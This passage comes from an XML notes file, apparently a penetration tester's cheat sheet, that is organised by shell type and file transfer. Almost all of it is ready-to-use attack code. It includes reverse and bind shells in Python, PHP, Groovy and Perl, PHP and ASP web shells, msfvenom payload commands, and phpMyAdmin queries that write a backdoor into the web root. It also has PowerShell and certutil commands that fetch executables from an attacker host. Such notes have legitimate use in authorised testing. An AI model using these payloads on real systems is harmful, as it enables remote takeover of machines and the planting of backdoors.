          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">));os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
          <rich_text family="monospace">)
p</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">subprocess.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
        </node>
        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text>PHP</rich_text>
          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
          </node>
          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
          </node>
          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace"> </rich_text>
            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Call the CMD shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
            <rich_text family="monospace">cmd=whoami</rich_text>
          </node>
          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 2</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">As Command</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
          </node>
        </node>
        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Meterpreter:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
          </node>
          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> bind_shell.elf</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
          </node>
          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> shell.jsp</rich_text>
          </node>
          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
          </node>
        </node>
        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Execute a File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"/bin/sh";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"cmd.exe";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Perl</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">perl -MIO </rich_text>
          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">PhpmyAdmin
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Unix</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
        </node>
        <node name="powershell" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701626719" ts_lastsave="1701626901">
          <rich_text>

</rich_text>
          <rich_text link="webs https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</rich_text>
          <rich_text>

use this


Ex:  `</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`</codebox>
        </node>
      </node>
      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1701639277">
          <rich_text underline="single" scale="h1">Powershell</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
          <rich_text>
Very helpful for chars that need to be escaped otherwise.

</rich_text>
          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="665" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil -urlcache -f http://10.10.14.21/rev.exe rev.exe</codebox>
        </node>
